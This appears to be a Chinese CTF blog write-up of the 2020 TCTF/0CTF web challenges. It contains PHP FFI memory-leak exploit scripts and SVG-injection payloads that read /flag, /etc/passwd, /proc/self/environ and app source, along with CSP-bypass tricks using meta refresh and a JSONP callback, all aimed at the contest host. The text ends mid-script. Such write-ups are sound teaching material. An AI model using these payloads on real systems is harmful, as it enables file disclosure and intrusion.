@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020 TCTF0CTF Web题目复现 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020TCTF0CTFWeb题目复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020 TCTF0CTF Web题目复现
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-07-01T04:13:34.000Z" itemprop="datePublished">2020-07-01</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>TCTF几道Web题目复现</p>
+<a id="more"></a>
+
+<h1 id="0x01-easyphp-amp-noteasyphp"><a href="#0x01-easyphp-amp-noteasyphp" class="headerlink" title="0x01 easyphp&amp;noteasyphp"></a>0x01 easyphp&amp;noteasyphp</h1><p>限制了disable_function和openbase_dir.</p>
+<p>首先可以利用glob来列根目录</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707123003919.png" alt="image-20200707123003919"></p>
+<p>读不了文件，看phpinfo开了FFI扩展，参考飘零师傅和CJm00n师傅的博客，题目需要利用FFI的memcpy来泄露内存。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php ffi捕获异常</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$ffi = FFI::cdef(<span class="string">"int test()"</span>,);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(FFI\<span class="keyword">Exception</span> $ex)&#123;</span><br><span class="line">	<span class="keyword">echo</span> $ex-&gt;getMessage(),PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144552484.png" alt="image-20200707144552484"></p>
+<p>题目禁止了cdef。然后去看看FFI<a href="https://www.php.net/manual/zh/book.ffi.php" target="_blank" rel="noopener">的其他函数</a>，</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144702756.png" alt="image-20200707144702756"></p>
+<ul>
+<li><p>load():可以从C的头文件加载C声明。</p>
+</li>
+<li><p>new():创建一个C数据结构，第一个参数是数据类型，第二个参数可以确定是创建拥有（即托管）数据还是非托管数据。 托管数据与返回的FFI \ CData对象一起存在，并在通过常规PHP引用计数或GC释放对该对象的最后一个引用时释放。 当不再需要时，应通过调用FFI :: free（）释放非托管数据。若为false，即不会自动free。</p>
+</li>
+<li><p>memcpy():将size大小的字节从内存区域src复制到内存区域dst。</p>
+</li>
+<li><p>string():从内存区域创建PHP字符串。</p>
+</li>
+<li><p>arrayType():动态构造一个新的C数组类型，其元素类型由类型定义，维数由第二个参数指定。</p>
+</li>
+</ul>
+<p>泄露的步骤：</p>
+<ol>
+<li>首先加载flag.h</li>
+<li>开辟一个存放字符数组的空间，保存首元素的地址。</li>
+<li>开辟一个用来存放复制内容的空间，保存首元素的空间。</li>
+<li>将等2步得到的地址向前推一个大的范围，复制到第3步得到的地址中。</li>
+<li>利用string将复制的内容变成字符串，打印出来。</li>
+</ol>
+<blockquote>
+<p>cjm00n</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&#x2F;&quot;</span><br><span class="line">sess &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> param &#x3D; &#123;</span><br><span class="line">     &quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false); </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType(FFI::type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $a-0x24000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> &#125;</span><br><span class="line"> resp &#x3D; sess.get(url, params&#x3D;param).text</span><br><span class="line"> print(resp)</span><br><span class="line"> open(&quot;out&quot;, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;).write(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"> exp()</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144913364.png" alt="image-20200707144913364"></p>
+<p>运行函数获得flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ffi=FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">    $a =($ffi-&gt;flag_fUn3t1on_fFi());</span><br><span class="line">    var_dump(FFI::string($a,<span class="number">50</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (FFI\<span class="keyword">Exception</span> $ex) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707152953562.png" alt="image-20200707152953562"></p>
+<blockquote>
+<p>nu1l</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);$char&#x3D;$flag-&gt;new(&quot;char[0x30]&quot;,false);$char&#x3D;FFI::addr($char);FFI::free($char);$loadflag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);print_r($char);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>sky</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&quot;</span><br><span class="line">params &#x3D; &#123;&quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> &#x2F;&#x2F;get flag</span><br><span class="line"> &#x2F;&#x2F;$a &#x3D; $ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line"> &#x2F;&#x2F;for($i &#x3D; 0; $i &lt; 128; $i++)&#123;</span><br><span class="line">     echo $a[$i];</span><br><span class="line"> &#x2F;&#x2F;&#125;</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $a[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $a[4] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[5] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[6] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[7] &#x3D; &#39;g&#39;;</span><br><span class="line"> $b &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $b[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $b[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $b[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $b[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $newa &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $a);</span><br><span class="line"> var_dump($newa);</span><br><span class="line"> $newb &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $b);</span><br><span class="line"> var_dump($newb);</span><br><span class="line"> </span><br><span class="line"> $addr_of_a &#x3D; FFI::new(&quot;unsigned long long&quot;);</span><br><span class="line"> FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span><br><span class="line"> var_dump($addr_of_a);</span><br><span class="line"> </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType($ffi-&gt;type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $newa-0x20000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F;var_dump($leak);</span><br><span class="line"> &#x2F;&#x2F;$leak[0] &#x3D; 0xdeadbeef;</span><br><span class="line"> &#x2F;&#x2F;$leak[1] &#x3D; 0x61616161;</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;FFI::memcpy($newa-0x8, $leak, 128*8);</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;var_dump(777);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(1);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(url&#x3D;url,params&#x3D;params)</span><br><span class="line"></span><br><span class="line">print((res.text).encode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>非预期</p>
+<p><a href="https://ctftime.org/task/12159" target="_blank" rel="noopener">https://ctftime.org/task/12159</a></p>
+</blockquote>
+<h1 id="0x02-Wechat-Generator"><a href="#0x02-Wechat-Generator" class="headerlink" title="0x02 Wechat Generator"></a>0x02 Wechat Generator</h1><p>有两个路由，分别时/share和/preview</p>
+<p>可以输入消息，点击preview，得到预览界面。点击share，跳到一个分享图片的链接。</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234622195.png" alt="image-20200703234622195"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234741264.png" alt="image-20200703234741264"></p>
+<p>然后访问这个图片，<a href="http://pwnable.org:5000/image/tAWfUu/png" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/png</a></p>
+<p>将后面的png改成htm或svg可以得到<a href="http://pwnable.org:5000/image/tAWfUu/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/svg</a></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235629001.png" alt="image-20200703235629001"></p>
+<p>然后在发送表情包的时候发现如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:5000</span><br><span class="line">Content-Length: 46</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;pwnable.org:5000</span><br><span class="line">Referer: http:&#x2F;&#x2F;pwnable.org:5000&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Mount4in [smile]&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235518881.png" alt="image-20200703235518881"></p>
+<p>之后发现可以在smile后面加上双引号闭合前面，然后利用使用 <code>xlink:href</code>读文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;flag\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234459101.png" alt="image-20200702234459101"></p>
+<p>显示Good job</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234535125.png" alt="image-20200702234535125"></p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[smile.png&quot;&#x2F;&gt;&lt;image width&#x3D;&quot;1200&quot; height&#x3D;&quot;1200&quot; href&#x3D;&quot;text:&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt; &lt;image href&#x3D;&quot;x]</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://oioki.me/2020/07/0ctf-tctf-2020-quals/这种方法也可以读文件" target="_blank" rel="noopener">https://oioki.me/2020/07/0ctf-tctf-2020-quals/这种方法也可以读文件</a></p>
+</blockquote>
+<p>之后读/proc/self/environ,发现有过滤，双写可以绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;proc&#x2F;self&#x2F;environ\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234657290.png" alt="image-20200702234657290"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;enenvviron\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234859538.png" alt="image-20200702234859538"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235047336.png" alt="image-20200702235047336"></p>
+<p>继续读/proc/self/maps</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;prprococ&#x2F;self&#x2F;maps\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235153918.png" alt="image-20200702235153918"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235414315.png" alt="image-20200702235414315"></p>
+<p>之后读/app/app.py</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702235556740.png" alt="image-20200702235556740"></p>
+<p>看到/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws路由，需要alert(1)才可以读到flag，有CSP如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure>
+
+<p>利用meta refresh进行跳转，在服务器上放</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;memetata http-equiv&#x3D;\&quot;refresh\&quot; content&#x3D;\&quot;0; url&#x3D;http:&#x2F;&#x2F;*******&#x2F;0ctf&#x2F;\&quot;&gt;&lt;&#x2F;memetata&gt;\&quot;]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235118990.png" alt="image-20200703235118990"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200704000825506.png" alt="image-20200704000825506"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234318318.png" alt="image-20200703234318318"></p>
+<p>还有另一种做法，绕过CSP，因为要同源，所以要找到<a href="http://pwnable.org:5000同源的里面包含alert(1)，@hyperreality师傅在http://pwnable.org:5000/image/DFBkps/png?callback找到了callback参数，而且可以添加引号闭合，构造出alert(1)。" target="_blank" rel="noopener">http://pwnable.org:5000同源的里面包含alert(1)，@hyperreality师傅在http://pwnable.org:5000/image/DFBkps/png?callback找到了callback参数，而且可以添加引号闭合，构造出alert(1)。</a></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165651426.png" alt="image-20200707165651426"></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165745653.png" alt="image-20200707165745653"></p>
+<p>将这个链接添加到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\&quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;xzEHbO&#x2F;png?callback&#x3D;d&#x3D;&#39;\&quot; &#x2F;&gt; ] &quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>然后得到share的图片链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;: &quot;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#x2F;eDlIfk&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<a href="http://pwnable.org:5000/image/eDlIfk/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/eDlIfk/svg</a></p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707165905869.png" alt="image-20200707165905869"></p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">&gt;import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def preview(svg_data):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;data&#39;: svg_data</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;preview&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    previewid &#x3D; resp[&quot;previewid&quot;]</span><br><span class="line">    data &#x3D; resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;previewid&quot;], resp[&quot;data&quot;]</span><br><span class="line">   </span><br><span class="line">def share(previewid):</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">      &#39;previewid&#39;: previewid</span><br><span class="line"> &#125;</span><br><span class="line">    response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;share&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text[:100])</span><br><span class="line"> resp &#x3D; json.loads(response.text)</span><br><span class="line">   </span><br><span class="line">    return resp[&quot;url&quot;]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   ### Stage 1: read files</span><br><span class="line">   </span><br><span class="line"># URL &#x3D; &quot;http:&#x2F;&#x2F;r0p.me&#x2F;bla.svg&quot;</span><br><span class="line">   # URL &#x3D; &quot;text:&#x2F;etc&#x2F;os-release&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;proc&#x2F;self&#x2F;environ&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;flag&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;usr&#x2F;share&#x2F;ghostscript&#x2F;9.27&#x2F;Resource&#x2F;Init&#x2F;gs_ll3.ps&quot;</span><br><span class="line"># URL &#x3D; &quot;text:&#x2F;etc&#x2F;ImageMagick-6&#x2F;policy.xml&quot;</span><br><span class="line">URL &#x3D; &quot;text:&#x2F;app&#x2F;app.py&quot;</span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;image height&#x3D;\\&quot;1600\\&quot; width&#x3D;\\&quot;1000\\&quot; xlink:href&#x3D;\\&quot;&#39; + URL + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line"></span><br><span class="line">svg_decoded &#x3D; base64.b64decode(data.split(&#39;,&#39;)[1])</span><br><span class="line"># print(svg_decoded)</span><br><span class="line"></span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot;</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, 